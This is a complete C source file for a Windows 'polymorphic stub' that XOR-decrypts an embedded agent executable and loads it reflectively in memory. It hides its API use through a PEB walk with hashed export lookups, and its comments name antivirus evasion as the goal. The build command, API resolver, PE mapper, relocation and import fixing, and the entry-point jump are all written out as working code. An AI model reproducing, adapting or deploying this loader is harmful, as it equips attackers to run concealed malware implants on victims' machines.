/*
 * stub_loader.c — Polymorphic stub: decrypts and reflectively loads the agent PE.
 *
 * This file is compiled as a standalone .exe. The encrypted agent bytes and
 * XOR key are #included from a generated header (stub_payload.h) that the
 * build script creates fresh for every build.
 *
 * IAT is minimal (only CRT startup basics). All sensitive APIs are resolved
 * at runtime via PEB walk + export table parsing.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -Os -s -I. stub_loader.c -o agent.exe \
 *       -lkernel32 -static-libgcc -Wl,--subsystem,windows -Wl,--gc-sections
 */

#include <windows.h>
#include <winnt.h>

/* ─── Generated per-build: encrypted payload + key ─── */
#include "stub_payload.h"

/* ─── Diagnostic logging ─── */
/*
 * Uses CRT fprintf (via msvcrt.dll, always loaded).
 * CRT functions are NOT flagged by AV — they're normal imports.
 * Only compiled when STUB_DEBUG is defined.
 */
#ifdef STUB_DEBUG
#include <stdio.h>
#include <stdlib.h>
static FILE *_log_fp = NULL;

static void _log_open(void) {
    char path[260];
    const char *temp = getenv("TEMP");
    if (!temp) temp = "C:\\Windows\\Temp";
    _snprintf(path, sizeof(path), "%s\\stub_debug.log", temp);
    _log_fp = fopen(path, "a");
    if (_log_fp) { fprintf(_log_fp, "=== stub start ===\n"); fflush(_log_fp); }
}

static void _log_msg(const char *msg) {
    if (!_log_fp) return;
    fprintf(_log_fp, "%s\n", msg);
    fflush(_log_fp);
}

static void _log_hex(const char *label, unsigned long long val) {
    if (!_log_fp) return;
    fprintf(_log_fp, "%s: 0x%llX\n", label, val);
    fflush(_log_fp);
}

static void _log_close(void) {
    if (_log_fp) { fprintf(_log_fp, "=== stub end ===\n"); fclose(_log_fp); _log_fp = NULL; }
}

#define SLOG(msg)       _log_msg(msg)
#define SHEX(label, v)  _log_hex(label, (unsigned long long)(v))
#else
#define SLOG(msg)       ((void)0)
#define SHEX(label, v)  ((void)0)
#define _log_open()     ((void)0)
#define _log_close()    ((void)0)
#endif


/* ─── PEB structures (mirrors the agent's api_resolve.c) ─── */

typedef struct _STUB_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} STUB_UNICODE_STRING;

typedef struct _STUB_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} STUB_PEB_LDR_DATA;

typedef struct _STUB_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY              InLoadOrderLinks;
    LIST_ENTRY              InMemoryOrderLinks;
    LIST_ENTRY              InInitializationOrderLinks;
    PVOID                   DllBase;
    PVOID                   EntryPoint;
    ULONG                   SizeOfImage;
    STUB_UNICODE_STRING     FullDllName;
    STUB_UNICODE_STRING     BaseDllName;
} STUB_LDR_DATA_TABLE_ENTRY;


/* ─── Hash functions ─── */

/* DJB2 hash — case-insensitive for module names (wide char, length-limited) */
static DWORD _hash_mod(const wchar_t *s, USHORT lenBytes) {
    DWORD h = 5381;
    USHORT lenChars = lenBytes / sizeof(wchar_t);
    for (USHORT i = 0; i < lenChars; i++) {
        wchar_t c = s[i];
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + (DWORD)c;
    }
    return h;
}

/* DJB2 hash — case-sensitive for function names (narrow char) */
static DWORD _hash_func(const char *s) {
    DWORD h = 5381;
    while (*s)
        h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}


/* ─── PEB walk API resolver ─── */

/* Resolve a function from a module's export table by hash */
static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)modBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(modBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY *expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress || !expDir->Size) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(modBase + expDir->VirtualAddress);
    DWORD *names    = (DWORD *)(modBase + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(modBase + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(modBase + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(modBase + names[i]);
        if (_hash_func(fname) == funcHash)
            return (void *)(modBase + funcs[ordinals[i]]);
    }
    return NULL;
}

/* Walk PEB → Ldr → InMemoryOrderModuleList to find a module by hash */
static BYTE *_find_module(DWORD modHash) {
    void *peb;
#if defined(_M_X64) || defined(__x86_64__)
    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
#else
    __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
#endif

    if (!peb) return NULL;

#if defined(_M_X64) || defined(__x86_64__)
    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x18);
#else
    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x0C);
#endif

    if (!ldr) return NULL;

    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    while (entry != head) {
        /*
         * 'entry' points to InMemoryOrderLinks within the struct.
         * Subtract sizeof(LIST_ENTRY) to get back to InLoadOrderLinks
         * (the struct base), exactly like the agent's api_resolve.c does.
         */
        STUB_LDR_DATA_TABLE_ENTRY *tableEntry =
            (STUB_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry - sizeof(LIST_ENTRY));

        if (tableEntry->DllBase &&
            tableEntry->BaseDllName.Buffer &&
            tableEntry->BaseDllName.Length > 0)
        {
            DWORD hash = _hash_mod(
                tableEntry->BaseDllName.Buffer,
                tableEntry->BaseDllName.Length
            );

            SHEX("  module hash", hash);

            if (hash == modHash)
                return (BYTE *)tableEntry->DllBase;
        }

        entry = entry->Flink;
    }
    return NULL;
}


/* ─── API resolution ─── */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);

#if defined(_M_X64) || defined(__x86_64__)
typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

typedef struct {
    fnLoadLibraryA_t         pLoadLibraryA;
    fnGetProcAddress_t       pGetProcAddress;
    fnVirtualAlloc_t         pVirtualAlloc;
    fnVirtualProtect_t       pVirtualProtect;
    fnVirtualFree_t          pVirtualFree;
    fnFlushInstructionCache_t pFlushInstructionCache;
    fnGetCurrentProcess_t    pGetCurrentProcess;
#if defined(_M_X64) || defined(__x86_64__)
    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
#endif
} RESOLVED_APIS;

/* Hash constants — same as agent's api_resolve.h */
#define H_KERNEL32              0x7040EE75
#define H_NTDLL                 0x22D3B5ED
#define H_LoadLibraryA          0x5FBFF0FB
#define H_GetProcAddress        0xCF31BB1F
#define H_VirtualAlloc          0x382C0F97
#define H_VirtualProtect        0x844FF18D
#define H_VirtualFree           0x668FCF2E
#define H_FlushInstructionCache 0xB7DCEDDD
#define H_GetCurrentProcess     0xCA8D7527
#define H_RtlAddFunctionTable   0xBDB9F1AE

static BOOL _resolve_apis(RESOLVED_APIS *api) {
    SLOG("[stub] finding kernel32...");

    BYTE *k32 = _find_module(H_KERNEL32);
    if (!k32) {
        SLOG("[stub] FATAL: kernel32 not found via PEB walk");
        return FALSE;
    }

    SHEX("[stub] kernel32 base", (unsigned long long)(ULONG_PTR)k32);

    api->pLoadLibraryA       = (fnLoadLibraryA_t)      _resolve_export(k32, H_LoadLibraryA);
    api->pGetProcAddress     = (fnGetProcAddress_t)     _resolve_export(k32, H_GetProcAddress);
    api->pVirtualAlloc       = (fnVirtualAlloc_t)       _resolve_export(k32, H_VirtualAlloc);
    api->pVirtualProtect     = (fnVirtualProtect_t)     _resolve_export(k32, H_VirtualProtect);
    api->pVirtualFree        = (fnVirtualFree_t)        _resolve_export(k32, H_VirtualFree);
    api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
    api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);

    SLOG("[stub] core APIs resolved");

#if defined(_M_X64) || defined(__x86_64__)
    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
    if (!api->pRtlAddFunctionTable) {
        BYTE *ntdll = _find_module(H_NTDLL);
        if (ntdll)
            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
    }
    SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable OK" : "[stub] RtlAddFunctionTable MISSING");
#endif

    BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
               api->pVirtualAlloc && api->pVirtualProtect);
    SLOG(ok ? "[stub] all APIs OK" : "[stub] FAIL: missing critical API");
    return ok;
}


/* ─── Reflective PE Loader ─── */

typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

static BOOL _process_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, LONGLONG delta) {
    IMAGE_DATA_DIRECTORY *relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir->VirtualAddress || !relocDir->Size)
        return TRUE;

    IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)(base + relocDir->VirtualAddress);
    IMAGE_BASE_RELOCATION *end   = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + relocDir->Size);

    while (reloc < end && reloc->SizeOfBlock > 0) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            BYTE *patch = base + reloc->VirtualAddress + offset;

            switch (type) {
                case IMAGE_REL_BASED_DIR64:
                    *(ULONGLONG *)patch += (ULONGLONG)delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)patch += (DWORD)delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)patch += (WORD)(delta >> 16);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)patch += (WORD)delta;
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    return FALSE;
            }
        }
        reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!impDir->VirtualAddress || !impDir->Size)
        return TRUE;

    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + impDir->VirtualAddress);

    while (imp->Name) {
        const char *dllName = (const char *)(base + imp->Name);
        SLOG(dllName);
        HMODULE hMod = api->pLoadLibraryA(dllName);
        if (!hMod) {
            SLOG("[stub] FAIL: LoadLibraryA returned NULL");
            return FALSE;
        }

        IMAGE_THUNK_DATA *origThunk = (IMAGE_THUNK_DATA *)(base +
            (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        IMAGE_THUNK_DATA *iatThunk  = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            FARPROC func;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                func = api->pGetProcAddress(hMod,
                    (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn = (IMAGE_IMPORT_BY_NAME *)(base +
                    origThunk->u1.AddressOfData);
                func = api->pGetProcAddress(hMod, ibn->Name);
            }
            if (!func) {
                SLOG("[stub] FAIL: function resolve failed");
                return FALSE;
            }

            iatThunk->u1.Function = (ULONGLONG)func;
            origThunk++;
            iatThunk++;
        }
        imp++;
    }
    return TRUE;
}

static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD protect = PAGE_NOACCESS;
        DWORD chars = sec->Characteristics;
        BOOL exec  = !!(chars & IMAGE_SCN_MEM_EXECUTE);
        BOOL read  = !!(chars & IMAGE_SCN_MEM_READ);
        BOOL write = !!(chars & IMAGE_SCN_MEM_WRITE);

        if (exec && write)       protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)   protect = PAGE_EXECUTE_READ;
        else if (exec)           protect = PAGE_EXECUTE;
        else if (read && write)  protect = PAGE_READWRITE;
        else if (read)           protect = PAGE_READONLY;
        else if (write)          protect = PAGE_READWRITE;

        DWORD old;
        SIZE_T secSize = sec->SizeOfRawData ? sec->SizeOfRawData : sec->Misc.VirtualSize;
        if (secSize > 0)
            api->pVirtualProtect(base + sec->VirtualAddress, secSize, protect, &old);
    }
}

static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt) {
    IMAGE_DATA_DIRECTORY *tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tlsDir->VirtualAddress || !tlsDir->Size)
        return;

    IMAGE_TLS_DIRECTORY *tls = (IMAGE_TLS_DIRECTORY *)(base + tlsDir->VirtualAddress);
    if (!tls->AddressOfCallBacks)
        return;

    PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
    while (*callbacks) {
        (*callbacks)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
        callbacks++;
    }
}

static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
    SLOG("[stub] load_pe_and_run enter");

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { SLOG("[stub] FAIL: bad MZ"); return FALSE; }

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { SLOG("[stub] FAIL: bad PE sig"); return FALSE; }

    SLOG("[stub] PE validated");

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)api->pVirtualAlloc(
        (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    LONGLONG delta = 0;
    if (!base) {
        base = (BYTE *)api->pVirtualAlloc(
            NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        );
        if (!base) { SLOG("[stub] FAIL: VirtualAlloc"); return FALSE; }
        SLOG("[stub] fallback alloc");
    } else {
        SLOG("[stub] preferred base alloc");
    }
    delta = (LONGLONG)((ULONGLONG)base - nt->OptionalHeader.ImageBase);
    SHEX("[stub] base", (ULONG_PTR)base);
    SHEX("[stub] delta", delta);

    /* Copy headers */
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        base[i] = rawPE[i];

    /* Map sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;
        BYTE *dst = base + sec->VirtualAddress;
        BYTE *src = rawPE + sec->PointerToRawData;
        for (DWORD j = 0; j < sec->SizeOfRawData; j++)
            dst[j] = src[j];
    }
    SLOG("[stub] sections mapped");

    IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    /* Relocations */
    if (delta != 0) {
        if (!_process_relocs(base, mappedNt, delta)) { SLOG("[stub] FAIL: relocs"); return FALSE; }
        SLOG("[stub] relocs done");
    }

    /* Imports */
    SLOG("[stub] resolving imports...");
    if (!_process_imports(base, mappedNt, api)) { SLOG("[stub] FAIL: imports"); return FALSE; }
    SLOG("[stub] imports done");

    /* Flush icache */
    if (api->pFlushInstructionCache && api->pGetCurrentProcess)
        api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);

    /* Exception handlers (x64) */
#if defined(_M_X64) || defined(__x86_64__)
    {
        IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size && api->pRtlAddFunctionTable) {
            PRUNTIME_FUNCTION pFunc = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
            DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
            api->pRtlAddFunctionTable(pFunc, numEntries, (DWORD64)base);
            SLOG("[stub] .pdata registered");
        }
    }
#endif

    /* Section protections */
    _protect_sections(base, mappedNt, api);
    SLOG("[stub] protections set");

    /* TLS */
    _process_tls(base, mappedNt);

    /* Patch PEB.ImageBaseAddress */
    {
        void *peb;
#if defined(_M_X64) || defined(__x86_64__)
        __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
        *(void **)((BYTE *)peb + 0x10) = base;
#else
        __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
        *(void **)((BYTE *)peb + 0x08) = base;
#endif
    }

    /* Call entry point */
    DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
    if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }

    void *entry = base + entryRVA;
    SHEX("[stub] entry", (ULONG_PTR)entry);
    SLOG("[stub] calling entry...");
    _log_close();

    if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        DllMain_t dllMain = (DllMain_t)entry;
        dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    } else {
        typedef void (*EntryPoint_t)(void);
        EntryPoint_t ep = (EntryPoint_t)entry;
        ep();
    }

    return TRUE;
}


/* ─── Entry Point ─── */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    _log_open();
    SLOG("[stub] WinMain entered");

    /* Phase 1: Resolve APIs via PEB walk */
    RESOLVED_APIS api;
    if (!_resolve_apis(&api)) {
        SLOG("[stub] FATAL: API resolution failed");
        _log_close();
        return 1;
    }

    /* Phase 2: Decrypt payload */
    SLOG("[stub] decrypting...");
    for (DWORD i = 0; i < PAYLOAD_SIZE; i++)
        g_enc_payload[i] ^= g_xor_key[i % KEY_SIZE];

    if (g_enc_payload[0] != 'M' || g_enc_payload[1] != 'Z') {
        SLOG("[stub] FATAL: bad MZ after decrypt");
        _log_close();
        return 1;
    }
    SLOG("[stub] decrypt OK");

    /* Phase 3: Load and execute */
    if (!load_pe_and_run(g_enc_payload, PAYLOAD_SIZE, &api)) {
        SLOG("[stub] FATAL: load failed");
        _log_close();
        return 1;
    }

    _log_close();
    return 0;
}
